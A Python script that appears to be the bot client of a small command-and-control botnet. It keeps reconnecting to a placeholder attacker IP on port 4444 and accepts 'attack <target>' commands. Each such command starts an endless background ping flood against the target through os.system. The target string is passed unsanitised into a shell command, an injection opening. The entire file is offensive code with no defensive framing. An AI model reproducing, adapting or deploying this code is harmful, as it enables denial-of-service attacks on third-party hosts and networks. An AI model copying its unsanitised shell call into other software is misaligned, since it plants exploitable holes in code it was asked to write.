import socket
import os
import subprocess

c2_ip = "<KALI OR ATTACKER'S MACHINE IP WHERE THE C2 SERVER (c2_server.py) IS RUNNING FROM>"
c2_port = 4444

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((c2_ip, c2_port))
		print("[+] Connected to C2")

		while True:
			command = s.recv(1024).decode().strip()
			if command.startswith("attack"):
				target = command.split()[1]
				print(f"[!] Launching attack on {target}")
				while True:
					os.system(f"ping -c1 {target} &")
	except:
		continue
